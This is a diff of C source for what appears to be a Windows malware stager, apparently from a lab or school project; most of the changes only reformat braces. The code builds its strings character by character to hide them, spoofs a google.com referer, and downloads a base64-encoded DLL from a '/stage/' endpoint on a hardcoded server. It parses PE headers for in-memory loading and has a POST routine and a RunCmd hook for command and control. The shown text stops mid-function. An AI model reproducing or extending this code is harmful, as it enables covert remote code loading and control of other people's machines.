@@ -65,7 +65,8 @@ typedef CHAR*(WINAPI *RUNCMD)(CCHAR* cmd, PDWORD size);
 #define WINHTTP_HEADER_NAME_BY_INDEX NULL
 #define WINHTTP_NO_HEADER_INDEX NULL
 
-typedef struct API_ {
+typedef struct API_
+{
     UINT64 LoadLibraryA;
     UINT64 CloseHandle;
     UINT64 GlobalMemoryStatusEx;
@@ -107,21 +108,25 @@ typedef struct API_ {
     UINT64 snprintf;
 } API, *PAPI;
 
-typedef struct ESG_STD_API_ {
+typedef struct ESG_STD_API_
+{
     UINT64 RunCmd;
 } ESG_STD_API, *PESG_STD_API;
 
-typedef struct DLL_ {
+typedef struct DLL_
+{
     LPVOID Buffer;
     DWORD Size;
 } DLL, * PDLL;
 
 
-size_t base64_raw_size(size_t len) {
+size_t base64_raw_size(size_t len)
+{
     size_t padding = 0;
 
     // Determine padding based on the length of the Base64 string
-    if (len > 0) {
+    if (len > 0)
+    {
         padding = (len % 4 == 0) ? 0 : (4 - (len % 4));
     }
 
@@ -151,9 +156,8 @@ int myStrlenA(const CHAR* s1)
 {
     const CHAR *s2 = s1; // Pointer to traverse the string
 
-    while (*s2) {
-        s2++;
-    }
+    while (*s2)
+    { s2++; }
     return s2 - s1;
 }
 
@@ -161,9 +165,8 @@ int myStrlenW(const WCHAR* s1)
 {
     const WCHAR *s2 = s1; // Pointer to traverse the wide string
 
-    while (*s2) {
-        s2++;
-    }
+    while (*s2)
+    { s2++; }
     return s2 - s1;
 }
 
@@ -185,58 +188,46 @@ wchar_t* myConcatW(PAPI api, const wchar_t *s1, const wchar_t *s2)
     return result;
 }
 
-DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress) {
-  WORD wIndex = 0;
-  PIMAGE_SECTION_HEADER pSectionHeader = NULL;
-  PIMAGE_NT_HEADERS pNtHeaders = NULL;
+DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
+{
+    WORD wIndex = 0;
+    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
+    PIMAGE_NT_HEADERS pNtHeaders = NULL;
 
-  pNtHeaders =
-      (PIMAGE_NT_HEADERS)(uiBaseAddress +
-                          ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
+    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
 
-  pSectionHeader =
-      (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) +
-                              pNtHeaders->FileHeader.SizeOfOptionalHeader);
+    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
 
-  if (dwRva < pSectionHeader[0].PointerToRawData)
-    return dwRva;
+    if (dwRva < pSectionHeader[0].PointerToRawData)
+    { return dwRva; }
 
-  for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
-    if (dwRva >= pSectionHeader[wIndex].VirtualAddress &&
-        dwRva < (pSectionHeader[wIndex].VirtualAddress +
-                 pSectionHeader[wIndex].SizeOfRawData))
-      return (dwRva - pSectionHeader[wIndex].VirtualAddress +
-              pSectionHeader[wIndex].PointerToRawData);
-  }
+    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
+    {
+        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
+        { return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData); }
+    }
 
-  return 0;
+    return 0;
 }
 
 CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
 {
-    WCHAR wVerb[] = {
-      'G', 'E', 'T', 0
-    };
+    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
 
-    WCHAR wUserAgent[] = {
-      'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
-    };
+    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
 
-    WCHAR wVersion[] = {
-      'H', 'T', 'T', 'P', 0
-    };
+    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
 
-    WCHAR wReferer[] = {
-    'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
-    };
+    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
 
-    WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
-    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};
+    WCHAR wProxy[] = { 'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0 };
+    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
     INTERNET_PORT dwPort = 5001;
     DWORD dwBufferSize;
 
-    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)(
+    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
+    (
         wUserAgent,
         1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
         wProxy,
@@ -245,16 +236,18 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     );
 
     #ifdef DEBUG
-    if (hSession == NULL){
-        WCHAR error[] = {'O', 'p', 'e', 'n', 'F', 0};
+    if (hSession == NULL)
+    {
+        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
         ((WPRINTF)api->wprintf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
 
-    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(
+    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
+    (
         hSession,
         wcServer,
         port,
@@ -262,16 +255,18 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     );
 
     #ifdef DEBUG
-    if (hConnect == NULL){
-        WCHAR error[] = {'C', 'o', 'n', 'n', 'F', 0};
+    if (hConnect == NULL)
+    {
+        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
         ((WPRINTF)api->wprintf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
 
-    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)(
+    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
+    (
         hConnect,
         wVerb,
         wcPath,
@@ -282,18 +277,20 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     );
 
     #ifdef DEBUG
-    if (hRequest == NULL){
-        CHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
+    if (hRequest == NULL)
+    {
+        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
         ((PRINTF)api->printf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->printf)(myFormat2, errorCode);
         ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
     }
     #endif
 
     // Send the request
-    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(
+    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
+    (
         hRequest,
         NULL,
         0,
@@ -302,22 +299,24 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     );
 
     #ifdef DEBUG
-    if (reqSuccess == FALSE) {
-        WCHAR error[] = {'S', 'e', 'n', 'd', 'F', '\n', 0};
+    if (reqSuccess == FALSE)
+    {
+        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
         ((WPRINTF)api->wprintf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
 
     BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
     #ifdef DEBUG
-    if (rcvResponse == FALSE) {
-        WCHAR error[] = {'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0};
+    if (rcvResponse == FALSE)
+    {
+        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(error, rcvResponse);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
@@ -325,21 +324,36 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     LPVOID lpContentLength = NULL;
     DWORD dwBufferLength = 0;
     BOOL result = FALSE;
+
     // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
-    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
+    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
+    (
+        hRequest,
+        WINHTTP_QUERY_CONTENT_LENGTH,
+        WINHTTP_HEADER_NAME_BY_INDEX,
+        NULL,
+        &dwBufferLength,
+        WINHTTP_NO_HEADER_INDEX
+    );
 
     if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
     {
         // Allocate the calculated buffer
         lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));
 
-        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)( hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpContentLength, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
+        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
+        (
+            hRequest,
+            WINHTTP_QUERY_CONTENT_LENGTH,
+            WINHTTP_HEADER_NAME_BY_INDEX,
+            lpContentLength,
+            &dwBufferLength,
+            WINHTTP_NO_HEADER_INDEX
+        );
     }
 
     if (result)
-    {
-        dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
-    }
+    { dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength); }
     else
     {
         #ifdef DEBUG
@@ -355,17 +369,20 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     LPDWORD lpActuallyRead = &actuallyRead;
     BOOL readSuccess ;
 
-    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0) {
-        readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)(
+    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0)
+    {
+        readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
+        (
             hRequest,
             (LPVOID)(cpBuffer+bufferIndexChange),
             availableBytes,
             lpActuallyRead
         );
+
         // Check for buffer overflow risk
-        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwBufferSize / sizeof(WCHAR)) {
-            break;
-        }
+        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwBufferSize / sizeof(WCHAR))
+        { break; }
+
         bufferIndexChange += availableBytes/sizeof(WCHAR);
     }
 
@@ -374,31 +391,25 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     return NULL;
 }
 
-void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CHAR* data) {
+void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CHAR* data)
+{
     LPSTR pszData = (LPSTR)data;
     BOOL bResults = FALSE;
 
-    WCHAR wVerb[] = {
-      'P', 'O', 'S', 'T', 0
-    };
+    WCHAR wVerb[] = { 'P', 'O', 'S', 'T', 0 };
 
-    WCHAR wUserAgent[] = {
-      'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
-    };
+    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
 
-    WCHAR wVersion[] = {
-      'H', 'T', 'T', 'P', 0
-    };
+    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
 
-    WCHAR wReferer[] = {
-    'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
-    };
+    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
 
-    WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
-    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};
-    WCHAR contentType[] = {'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0};
+    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
+    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
+    WCHAR contentType[] = { 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0 };
 
-    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)(
+    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
+    (
         wUserAgent,
         1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
         wProxy,
@@ -406,79 +417,79 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
         0
     );
 
-    if (hSession) {
+    if (hSession)
+    {
         // Specify an HTTP server
         HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(hSession, server, port, 0);
 
         if (hConnect) {
             // Create an HTTP request handle
             #define WINHTTP_FLAG_REFRESH 0x00000100
-            HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)(hConnect, wVerb, endpoint, wVersion, wReferer, NULL, WINHTTP_FLAG_REFRESH);
+            HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
+            (
+                hConnect,
+                wVerb,
+                endpoint,
+                wVersion,
+                wReferer,
+                NULL,
+                WINHTTP_FLAG_REFRESH
+            );
 
-            if (hRequest) {
+            if (hRequest)
+            {
                 // Send the request
-                bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(hRequest,
-                                              contentType,
-                                              0,
-                                              (LPVOID)pszData,
-                                              myStrlenA(pszData),
-                                              myStrlenA(pszData),
-                                              0);
+                bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
+                (
+                    hRequest,
+                    contentType,
+                    0,
+                    (LPVOID)pszData,
+                    myStrlenA(pszData),
+                    myStrlenA(pszData),
+                    0
+                );
 
                 // Wait for the response
-                if (bResults) {
-                    bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
-                }
+                if (bResults)
+                { bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL); }
             }
         }
     }
 }
 
 LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
-    WCHAR wVerb[] = {
-      'G', 'E', 'T', 0
-    };
+    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
 
-    WCHAR wEndpoint[] = {
-      '/', 's', 't', 'a', 'g', 'e', '/', 0
-    };
+    WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
 
-    WCHAR wUserAgent[] = {
-      'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
-    };
+    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
 
-    WCHAR wVersion[] = {
-      'H', 'T', 'T', 'P', 0
-    };
+    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
 
-    WCHAR wReferer[] = {
-    'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
-    };
+    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
 
-    WCHAR wUuid[] = {
-    '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0
-    };
+    WCHAR wUuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
 
     /*
     // Home
-    WCHAR wServer[13] = {
-      '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '0', 0
-    };
+    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '0', 0 };
     */
 
     // School
-    //WCHAR wServer[14] = {'1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0};
+    //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };
 
     // Host-Only
-    WCHAR wServer[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
+    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
 
-    WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
-    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};
+    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
+    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
     INTERNET_PORT dwPort = 5001;
     DWORD dwEncodedDllSize;
 
-    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)(
+    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
+    (
         wUserAgent,
         1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
         wProxy,
@@ -487,16 +498,18 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     );
 
     #ifdef DEBUG
-    if (hSession == NULL){
-        WCHAR error[] = {'O', 'p', 'e', 'n', 'F', 0};
+    if (hSession == NULL)
+    {
+        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
         ((WPRINTF)api->wprintf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
 
-    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(
+    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
+    (
         hSession,
         wServer,
         dwPort,
@@ -504,16 +517,18 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     );
 
     #ifdef DEBUG
-    if (hConnect == NULL){
-        WCHAR error[] = {'C', 'o', 'n', 'n', 'F', 0};
+    if (hConnect == NULL)
+    {
+        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
         ((WPRINTF)api->wprintf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
 
-    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)(
+    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
+    (
         hConnect,
         wVerb,
         wEndpoint,
@@ -524,11 +539,12 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     );
 
     #ifdef DEBUG
-    if (hRequest == NULL){
-        CHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
+    if (hRequest == NULL)
+    {
+        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
         ((PRINTF)api->printf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->printf)(myFormat2, errorCode);
         ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
     }
@@ -544,22 +560,24 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     );
 
     #ifdef DEBUG
-    if (reqSuccess == FALSE) {
-        WCHAR error[] = {'S', 'e', 'n', 'd', 'F', '\n', 0};
+    if (reqSuccess == FALSE)
+    {
+        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
         ((WPRINTF)api->wprintf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
 
     BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
     #ifdef DEBUG
-    if (rcvResponse == FALSE) {
-        WCHAR error[] = {'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0};
+    if (rcvResponse == FALSE)
+    {
+        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(error, rcvResponse);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
+        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
     #endif
@@ -567,15 +585,32 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     LPVOID lpContentLength = NULL;
     DWORD dwBufferLength = 0;
     BOOL result = FALSE;
+
     // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
-    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
+    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
+    (
+        hRequest,
+        WINHTTP_QUERY_CONTENT_LENGTH,
+        WINHTTP_HEADER_NAME_BY_INDEX,
+        NULL,
+        &dwBufferLength,
+        WINHTTP_NO_HEADER_INDEX
+    );
 
     if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
     {
         // Allocate the calculated buffer
         lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));
 
-        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)( hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpContentLength, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
+        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
+        (
+            hRequest,
+            WINHTTP_QUERY_CONTENT_LENGTH,
+            WINHTTP_HEADER_NAME_BY_INDEX,
+            lpContentLength,
+            &dwBufferLength,
+            WINHTTP_NO_HEADER_INDEX
+        );
     }
 
     if (result)
@@ -597,28 +632,37 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     DWORD actuallyRead = 0;
     LPDWORD lpActuallyRead = &actuallyRead;
   
-    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0) {
+    while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0 )
+    {
         //printf("Available Bytes: %d\n", availableBytes);
-        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)(
+        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
+        (
             hRequest,
             (LPVOID)(wcEncodedBuffer+bufferIndexChange),
             availableBytes,
             lpActuallyRead
         );
+
         // Check for buffer overflow risk
-        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR)) {
-            break;
-        }
+        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR))
+        { break; }
+
         bufferIndexChange += availableBytes/sizeof(WCHAR);
     }
 
-    //((WPRINTF)api->wprintf)(L"dwEncodedDllSize: %d\n", dwEncodedDllSize);
     *pdwDllSize = base64_raw_size(dwEncodedDllSize);
-    //((WPRINTF)api->wprintf)(L"pdwDllSize: %d\n", *pdwDllSize);
     LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));
 
-    //DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)((LPVOID)lpEncodedBuffer, dwEncodedDllSize, 0x000000001, lpRawBuffer, &dwEncodedDllSize, NULL, NULL);
